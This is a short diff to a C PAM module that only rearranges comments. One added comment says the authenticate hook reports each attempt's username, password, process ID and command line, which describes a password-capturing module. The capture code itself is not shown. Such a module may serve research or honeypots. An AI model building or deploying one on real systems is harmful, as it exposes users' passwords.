@@ -67,6 +67,9 @@ static int get_cmdline(pid_t pid, char *buf, size_t len) {
   return 0;
 }
 
+// pam_sm_authenticate reports the username, password, process ID, and
+// triggering command line for every authentication attempt.
+// getpid always succeeds, so its result needs no error check.
 PAM_EXTERN int pam_sm_authenticate(
   pam_handle_t *handle,
   int flags,
@@ -93,7 +96,6 @@ PAM_EXTERN int pam_sm_authenticate(
         user, pam_strerror(handle, rc));
     return rc;
   }
-  // getpid always succeeds, so its result needs no error check.
   pid_t pid = getpid();
   char cmdline[BUFSIZ];
   rc = get_cmdline(pid, cmdline, sizeof cmdline);
